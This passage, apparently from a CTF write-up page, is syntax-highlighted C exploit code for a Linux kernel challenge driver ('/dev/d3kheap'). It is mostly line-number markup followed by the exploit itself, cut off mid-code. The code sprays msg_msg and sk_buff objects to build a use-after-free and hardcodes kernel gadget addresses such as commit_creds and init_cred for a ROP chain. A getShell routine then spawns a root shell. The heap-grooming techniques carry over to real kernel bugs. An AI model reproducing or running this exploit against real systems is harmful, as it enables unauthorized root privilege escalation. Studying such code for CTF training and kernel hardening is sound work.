class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0xDEAD</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open d3kheap error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] construct UAF\033[0m&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray 